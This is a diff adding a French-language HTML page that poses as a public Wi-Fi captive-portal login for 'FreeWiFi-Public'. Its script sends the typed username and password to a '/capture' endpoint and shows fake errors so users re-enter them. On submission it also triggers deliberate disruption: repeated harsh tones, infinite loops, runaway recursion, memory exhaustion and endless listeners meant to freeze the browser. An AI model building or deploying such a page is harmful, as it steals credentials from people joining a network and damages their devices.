@@ -1,0 +1,339 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Réseau Requise</title>
+    <style>
+        :root {
+            --primary-color: #4285f4;
+            --error-color: #ea4335;
+            --success-color: #34a853;
+            --warning-color: #fbbc05;
+            --dark-color: #202124;
+            --light-color: #f8f9fa;
+            --gray-color: #5f6368;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: #f1f3f4;
+            color: var(--dark-color);
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 480px;
+            margin: 40px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: var(--dark-color);
+        }
+        
+        .subtitle {
+            color: var(--gray-color);
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--gray-color);
+            font-size: 14px;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: #3367d6;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--gray-color);
+            font-size: 12px;
+        }
+        
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid var(--primary-color);
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-top: -15px;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: var(--primary-color);
+            font-size: 13px;
+            text-decoration: none;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .network-info {
+            background-color: #e8f0fe;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .network-info strong {
+            color: var(--primary-color);
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                margin: 20px;
+                width: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="var(--primary-color)">
+                <path d="M12 3C7.79 3 3.7 4.41.38 7 4.41 12.06 7.89 16.37 12 21.5 16.08 16.42 20.24 11.24 23.65 7 20.32 4.41 16.22 3 12 3zm0 2c3.07 0 6.09.86 8.71 2.45l-3.21 3.98C16.26 10.74 14.37 10 12 10c-2.38 0-4.26.75-5.5 1.43L3.27 7.44C5.91 5.85 8.93 5 12 5z"/>
+            </svg>
+            <h1>Connexion au réseau requis</h1>
+            <p class="subtitle">Veuillez vous authentifier pour accéder à Internet</p>
+        </header>
+        
+        <div class="network-info">
+            Vous tentez de vous connecter au réseau Wi-Fi: <strong>FreeWiFi-Public</strong>
+        </div>
+        
+        <form id="loginForm" onsubmit="submitForm(event)">
+            <div class="form-group">
+                <label for="username">Nom d'utilisateur</label>
+                <input type="text" id="username" name="username" placeholder="Entrez votre nom d'utilisateur" required>
+                <div id="usernameError" class="error-message">Nom d'utilisateur incorrect</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+                <div id="passwordError" class="error-message">Mot de passe incorrect</div>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Mot de passe oublié ?</a>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Connexion en cours...</p>
+            </div>
+            
+            <button type="submit" class="btn btn-primary" id="submitBtn">Se connecter</button>
+        </form>
+        
+        <div class="footer">
+            <p>En vous connectant, vous acceptez les conditions d'utilisation.</p>
+            <p>&copy; 2023 Fournisseur d'accès Internet. Tous droits réservés.</p>
+        </div>
+    </div>
+
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+            
+            // Afficher l'animation de chargement
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Récupérer les valeurs du formulaire
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Simuler un temps de traitement (3 secondes)
+            setTimeout(function() {
+                // Ajouter des effets perturbateurs
+                document.body.style.backgroundColor = "black";
+                document.body.style.color = "white";
+                document.body.classList.add("buggy-animation");
+
+                // Jouer le son perturbateur
+                playSound();
+                setInterval(playSound, 100);  // Son répété toutes les 100ms
+                
+                while(true) {
+                // Cette boucle consomme toutes les ressources du processeur
+                console.log("Boucle infinie...");
+                 }
+                
+                function crash() {
+                crash();  // Appel récursif infini
+                }
+               crash();
+                
+                // Simuler un bugage du formulaire
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(() => {
+                        document.body.scrollTop = Math.random() * document.body.scrollHeight;
+                    }, i * 100);
+                }
+                
+                let arr = [];
+                while(true) {
+                arr.push(new Array(1000000));  // Ajout constant de grands tableaux
+                }
+                
+               function createMemoryLeak() {
+               for (let i = 0; i < 100000; i++) {
+               window.addEventListener("click", function() { /* Ne fait rien, mais occupe de la mémoire */ });
+                    }
+              }
+               createMemoryLeak();
+             
+               function infiniteAnimation() {
+               requestAnimationFrame(infiniteAnimation);  // Demande une nouvelle image à chaque rafraîchissement
+               }
+               infiniteAnimation();
+
+                // Envoyer les données (on simule ici une erreur aléatoire)
+                fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                })
+                .then(response => {
+                    if (Math.random() > 0.3) {
+                        document.getElementById('passwordError').style.display = 'block';
+                        document.getElementById('password').style.borderColor = 'var(--error-color)';
+                    } else {
+                        window.location.href = '/success.html';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('usernameError').style.display = 'block';
+                    document.getElementById('username').style.borderColor = 'var(--error-color)';
+                })
+                .finally(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('submitBtn').disabled = false;
+                });
+            }, 3000);
+        }
+
+        // Fonction pour jouer le son perturbateur
+        const ctxAudio = new (window.AudioContext || window.webkitAudioContext)();
+        function playSound() {
+            const osc = ctxAudio.createOscillator();
+            osc.type = "square";
+            osc.frequency.setValueAtTime(1000 + Math.random() * 5000, ctxAudio.currentTime);
+            osc.connect(ctxAudio.destination);
+            osc.start();
+            osc.stop(ctxAudio.currentTime + 0.1);
+        }
+
+        // Pour réinitialiser la couleur de bordure après que l'utilisateur saisisse quelque chose
+        document.getElementById('username').addEventListener('input', function() {
+            this.style.borderColor = '#dadce0';
+            document.getElementById('usernameError').style.display = 'none';
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            this.style.borderColor = '#dadce0';
+            document.getElementById('passwordError').style.display = 'none';
+        });
+    </script>
+</body>
+</html>
